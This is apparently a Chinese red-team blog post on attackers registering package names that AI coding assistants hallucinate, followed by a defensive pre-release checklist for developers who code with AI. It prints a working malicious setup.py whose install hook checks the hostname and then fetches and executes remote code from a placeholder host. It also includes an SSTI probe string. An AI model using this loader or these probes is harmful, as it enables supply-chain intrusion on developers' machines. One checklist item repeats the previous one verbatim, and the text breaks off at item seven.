---
title: AI编程助手“说瞎话”，背后隐藏的攻击手段
url: https://mp.weixin.qq.com/s/37P6dmOlIRpDgcSlGPPO5w
source: Doonsec's feed
date: 2026-04-14
fetch_date: 2026-04-15T04:40:41.310255
---

# AI编程助手“说瞎话”，背后隐藏的攻击手段

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/eDXiba58htLdricYbZNFauqbvbSzFQAic41oucfYTDYiaVHVypSEyMBibOwlnKtZsfh14l0DvGpWn7A6Vqkhcy654tbibvxj5Ij50te1YRU8GpaoQ/0?wx_fmt=jpeg)

# AI编程助手“说瞎话”，背后隐藏的攻击手段

原创

洞悉安全团队
洞悉安全团队

洞悉安全团队

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/mbN4aXsD2OA8twXkH6EnDwfjB4cC0h1mRWic3YEO10656mZIS8H1ghxIfvfT39N8Biag4CUumqhBmvrlia6QXticZQ/640?from=appmsg)

点击蓝字关注我们

引言：效率背后的“隐形投毒”

在 2026 年的红队实战与黑产对抗中，我们观察到一个显著的技术拐点：传统的 Web 边界漏洞（如常规 SQLi、RCE）因零信任架构与 AI 防火墙的普及而日趋枯竭。然而，开发者对 Vibe Coding 的依赖，却为红队开启了一扇前所未有的“后门”。

    开发者在 IDE 中使用 AI 助手（如 Cursor、GitHub Copilot）时，往往会形成一种“信任闭环”。这种现象催生了一种结合了心理学欺骗与工程化注入的新型攻击向量——AI 幻觉引导的供应链注入。

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLe7ZWSTPumwBZiaqKyHfnfKksTmVJIX6GCB8c0BNcKLiaoj6FUfB1lh2a6CrUnjJ51twnibCAZEPRgJzulZ9oJpWU1IqcIT9gCJUs/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLfCUlY7tbYLVCIbEEHXaWwSs6N65BzIqcFrULMcdNnPfFL3sW6A51JmMU70W1biaibv59XF6BqYMY1jhTahfzkBveLG1skMIeibEM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLd3ZsTvHbytrh5nKrRIS2qhWqDEKIW5kP5BGO1qBFlU9OEQOcEOYtgRa77WsAnzBMtliaKCwxO0JGXuQmibTP8IZOU8BtkGsAw5I/640?wx_fmt=png&from=appmsg)

红队视角：基于 AI 幻觉的“影子组件”劫持

01

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLfaSezUSGpJJoVThOGaQnvoKAml5y59yYoyheRBr9ziaMluLrI563cTWsVqAUDZanyLul4esHH4SmjocAHAkEbPA5QMdunIueQY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLdHV68NOQeMdO7TMhw7dgP5e4KLZAl7juLyUEbL4Xcz60H4RS9rYYe2UR9FKmTrSBXoGdbISAkQcYAuFdd0tribpq3whpCgQm8M/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLdq1cIMTqhic0vxwgwdbwqchP3mK3KiavmP0us4rSgnmmFjZKxs4hWahYlZD7glBeURwUI3EaoQUsetwphpjL8MypP906picGjHQE/640?wx_fmt=png&from=appmsg)

01

**捕获幻觉点**

    AI 模型（包括 Claude 4/5、GPT-5）在处理特定领域（如：国产密码学算法实现、过时的中间件私有插件、或新兴云厂商的 SDK）时，由于训练数据中存在知识盲区，会为了维持对话的连贯性，遵循命名惯例臆造出逻辑合理但并不存在的库名。

+ 情报收集阶段：红队针对特定高价值行业（如金融加解密、政务中间件）构造大量 Prompt 测试。

+ 脆弱点发现：当发现 AI 在给出代码建议时，高频（>10%）推荐一个官方 PyPI/NPM 并不存在的库（例如：py-sm-crypto-extension）时，该库名即成为“高价值投毒靶点”。

02

**武器化：利用元数据执行hook**

    在真实的供应链攻击中，成熟的黑客不会将恶意代码写在 .py 或 .js 的主逻辑中。因为随着 AI 审计工具的进步，这种显性后门极易被静态代码扫描（SAST）拦截。

    真正的利用点在于包管理器的元数据配置文件。以 Python 的 setup.py 为例，攻击者会利用 setuptools 的安装类实现非阻塞的载荷加载。

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLfgJSjwzP6cCCOj4ibZCVWFrjJ3xjcibGRuVVIeF4gjibWGTV5XY45YWBas14TzdMeUK6k0ELPjic99jccWUoPUFgyE5Fo1XtdJgWc/640?wx_fmt=png&from=appmsg)

实战案例：高度混淆的恶意加载器实现

```
import os, sys, base64from setuptools import setupfrom setuptools.command.install import installclass CustomInstall(install):    def run(self):        # 1. 环境指纹探测：通过 CPU 核心数、内存、特定文件路径识别是否为沙箱        if os.cpu_count() >= 2:            # 2. 定向精准打击：通过 base64 混淆内网域名，仅在特定企业主机下触发            target_marker = base64.b64decode("LmludGVybmFsLmNvbQ==").decode()            hostname = os.popen('hostname').read()
            if target_marker in hostname:                # 3. 内存加载与持久化：利用 python -c 执行远程载荷，不产生磁盘落文件                # 载荷通过 HTTPS 加密通信，伪装成常规组件更新流量                loader = "import urllib.request;exec(urllib.request.urlopen('https://rhost/v2/stg').read())"                os.system(f"{sys.executable} -c \"{loader}\" &")
        # 4. 回归正常安装流程，避免安装报错引起开发者怀疑        install.run(self)setup(    name="py-sm-crypto-extension",    version="1.0.4",    author="Security Research Group",    description="High-performance C extension for SM algorithms",    cmdclass={'install': CustomInstall})
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLeMhw0Ptl4enibiasyj4KsUzA0xuliaEmr6G1zQMyd9Rjm5rqiargWvibLFoggPP87JuY3ZdMNLzWJcBU2ll17z4sZaAG2Ksfzsy580/640?wx_fmt=png&from=appmsg)

审计坍塌：为什么 AI 不会告诉你代码有漏洞？

02

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLdEyO64dVkHkMYsZ2yTkFUrC8cjj0ewc6ze3uU9sKltE74e2YVTfceozxYuAibORqqaGficYdQyGDFdlCKuho8kSx14VXnZfxjJk/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLe78IYZfJ4ibzHxBxicibAPAChsO6p0aznS4GKWQED7OFWvgg6oZicciavCAPYeu6k6tFPyWxru5JHWqpoOnVF7V6gexAJKHqkclfrc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLcvDcTHPQBJKVANmVXJia2uwKibzkK859JhsH1j8K33iaSXgqDqE0jFmf52wlyuBbGWHZwPZSiaGPicPaYlaboPZVfMzw9fR1icayfzQ/640?wx_fmt=png&from=appmsg)

许多开发者存在一个认知偏差：

“AI 既然能帮我写出复杂的逻辑，那它一定具备基本的安全常识。”

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLd4Hmcq1Ipb4WDlN6CWlh66WBf7xAJj8yZJNzoMCYDiclcHy7R38oiaicpiaQlnGPfA1V9Gswl3aS0goia9scmFhJsNmCiaiaK6VjgYE4/640?wx_fmt=png&from=appmsg)

1、斯坦福研究：信心的“致命遮挡”

使用 AI 助手的开发者，不仅生成的漏洞代码比手写代码者多出 40%，且他们对代码安全性的“信心评分”却显著高于手写者。

这种现象被称为安全遮挡效应。AI 工具提供了一种“代码整洁、逻辑通顺”的假象，掩盖了底层的安全缺陷。

2、核心漏洞模式分析

BOLA ：

AI 倾向于生成“功能优先”的代码。在处理 REST API 的 CRUD 操作时，AI 常直接使用用户提供的 id 进行数据库检索，而忽略了在查询语句中强制绑定 owner\_id 进行属主验证。

SSRF ：

在处理 Webhook、图片 URL 拉取或文件转换任务时，AI 生成的代码极少包含对内网保留地址（如 10.0.0.0/8, 172.16.0.0/12）的 CIDR 级别过滤。

密钥泄露：

AI 无法识别开发、测试与生产环境的边界。它常会在代码注释或字面量中生成测试用的 sk-proj-xxx 等 API 密钥，一旦被开发者直接 Push，便造成永久性泄露。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLeSOHc6l7vl2wwH6wJFSJbibMb8KhW3icqk9icTPOiafBrk2ibt3rGcr9M3icfHppPcoZ96DTC6ibe2qFx68iax45TWciciclYTX8PMmuuHI/640?wx_fmt=png&from=appmsg)

氛围程序员安全自检：上线前必做的 7 件事

03

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLexVWEZ2r0NreTGRoRq8eBtdCCY1TtSq4XqKBbfNlCiceoMOhUBxrbGnzkrDD1EY1eDOT9njIENkCmutzkqftQRpTiaQibmXXTRnw/640?wx_fmt=png&from=appmsg)

在 2026 年，如果你单独与 AI 协同构建应用，你就是你自己的安全审计员。请在合并 PR 前，强制执行这份 30 分钟安全自检清单：

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLcJBrIiaOewNxEDpc0wlG1rp3RSiadnfGQ4Er1AQWOia67eHtPnzwt8Rg5YddkGUib5f8zznhrWWbqcKYibu4pW1tMM1ic2Dv6ztIRZo/640?wx_fmt=png&from=appmsg)

1、密钥泄露扫描

检测逻辑：不要只检查当前文件，要检查整个 Git 历史。

+ 命令：git log -p --all -S 'sk-' --source

+ 工具：使用 gitleaks 或 trufflehog 进行全量扫描。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLfn2CXibmEX3K5SbkaJ7O4FnYn5luBePyFXwbzkibZzTx5TzxdEKmL60ace2H0FB3lImYGDTQv1eAW0icy0lZCOYgowH8RRxnEiaicU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLfSFfDhoOaJb9b0Tb7ZYmBTapsPf5NFFGicA3KME5pNSvmwrcaQPP9nWYbTbhicHDO6qbM9qPnpQuKtibwSj98ZJd0iaxFYSgzKa2s/640?wx_fmt=png&from=appmsg)

2、越权验证

检测逻辑：开启无痕浏览器，绕过前端路由，直接请求后端 API。

+ 实战测试：使用 curl -i 请求一个本该受保护的路径。若返回 200 OK 而非 401/403，则说明 AI 生成的认证中间件未生效。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLfD48ibNsSAo6icsypibGN80kr2zk3zp2xZJpm1SW7ZTiaMOwiaagRKaZ2cXEGHYn5DR9GhE52T8fvWvfhISL8DYiazL2f8Gkytoficuc/640?wx_fmt=png&from=appmsg)

3、认证逻辑深度校验

检测逻辑：开启无痕浏览器，绕过前端路由，直接请求后端 API。

+ 实战测试：使用 curl -i 请求一个本该受保护的路径。若返回 200 OK 而非 401/403，则说明 AI 生成的认证中间件未生效。

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLe7nIZ3sv3oy1KOQsjTIW4va9IpkicODziaVvAPb8CIZ2MLfQnhXC7G5NRYFBaHf2hn6PleDzc2rPtC1dUHwtKHe4JXttQYS8MuQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLf8YEsMkRrX9XzAHUYicGBpCia435yb05jlcCYQmQrKs7smyW0uIpsr4IDyXDdpdWPiam8YgN1Lia2TiabSkrUHmlrlwhxnOgURunnc/640?wx_fmt=png&from=appmsg)

4、输入注入

检测逻辑：针对渲染层进行模板注入探测。

+ 测试向量：在输入框提交 {{7\*7}}。如果页面显示 49，则存在 SSTI（服务端模板注入）。

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLfoK9XHyc2IRg68DQ1upc9gULpuicFBCbibd1YfbJibC6SutHiaDQps6wvQpk4iak5uKhcPU9FXOiboc3dBqeaoBibw9Mmse7kvicr1Eds/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLdaLQwSxTkcGa67FcJ1AmricibxYpT5o0DDibEmozwSUJFY5S7Mabo4C2ohEHopDQ8RNrk9IcTjJwgU4zaXgTZeIT6biayCWpeoldc/640?wx_fmt=png&from=appmsg)

5、错误消息泄露检查

检测逻辑：故意发送畸形 JSON 载荷（例如缺失引号）。

+ 判定：若返回包含堆栈追踪（Stack Trace）、数据库表结构或绝对文件路径，说明代码未处理全局异常，这会为攻击者提供精准的内网资产拓扑。

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLfKYy3fqttWEn7mlfAVTBR6pBuIQrJQFibOEsnicIy0g4PKRCq1hpfTG7tVTwrUaJ0l0iciaVxNbZrOjIjK10t4SliaXmUwBNdSu4dg/640?wx_fmt=png&from=appmsg)

6、依赖项信誉审计

检测逻辑：重点核实 AI 推荐的新库。

+ 操作：执行 npm audit 或 pip audit。手动在官方仓库确认该库的创建日期（如果是过去 72 小时内创建且下载量极低，必须立即卸载并上报）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eDXiba58htLdfdOJayKZDD7pgqVDCCCccOBLiaiapd6pfu4P7llykFSbOo6TNicCFENQadbCPAXVI9NlueGh2Aia0orJzqsEz6g3Whsib2V6kruKs/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/eDXiba58htLfLPol7WsCnLliapkuaO0IbVnpyonNwvwkzg7tfBtZEDzFvrOeB7D6IbW0TzXVLp183kJQ5XTfvQg1mna0TLqoceDAuAfAetbjs/640?wx_fmt=png&from=appmsg)

7、调试路由清...